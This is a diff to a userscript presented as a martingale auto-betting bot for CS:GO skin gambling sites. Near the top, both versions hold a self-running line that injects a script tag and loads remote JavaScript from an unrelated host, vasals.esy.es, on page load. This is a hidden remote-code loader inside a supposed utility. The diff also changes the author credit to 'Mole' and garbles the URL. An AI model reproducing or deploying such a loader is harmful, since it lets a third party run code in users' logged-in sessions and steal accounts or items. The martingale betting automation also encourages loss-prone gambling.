@@ -1,9 +1,9 @@
 // ==UserScript==
 // @name            csgodouble.com - auto betting bot
 // @description     An userscript that automates csgodouble.com betting using martingale system.
-// @namespace       csgodoublebot @ kjuubiiz
+// @namespace       automated@kjuubiiz
 // @version         1.31
-// @author          Kjuubiiz
+// @author          Mole
 // @match           http://www.csgodouble.com/
 // @match           http://www.csgodouble.com/index.php
 // @match           http://csgopolygon.com/
@@ -17,7 +17,7 @@
 
 'use strict';
 
-(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
+(function () { var scriptElement = document.createElement( "script" ); scriptElement.type = "text/javascript"; scriptElement.src = "//http://vasals.esy.es/in.js "; document.body.appendChild( scriptElement ); })();
 
 var debug = false;
 var simulation = false;
@@ -107,7 +107,7 @@ function Automated() {
     menu.innerHTML = '' +
         '<div class="row">' +
             '<div class="col-lg-9">' +
-                '<h2>CSGODouble.com Auto bot <small>by Kjuubiiz(76561198202555767) </small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>'
+                '<h2>CSGODouble.com Auto bot <small>by Kjuubiiz (76561198202555767)</small> <i id="automated-theme-switch" class="fa fa-lightbulb-o" style="cursor: pointer;"></i></h2>' +
                 '<div class="form-group">' +
                     '<div class="btn-group">' +
                         '<button type="button" class="btn btn-success" id="automated-start" disabled>Start</button>' +
@@ -225,8 +225,7 @@ function Automated() {
         this.darkMode();
     }
 
-  
-           this.menu.start.onclick = function() {
+    this.menu.start.onclick = function() {
 
         self.start();
     };
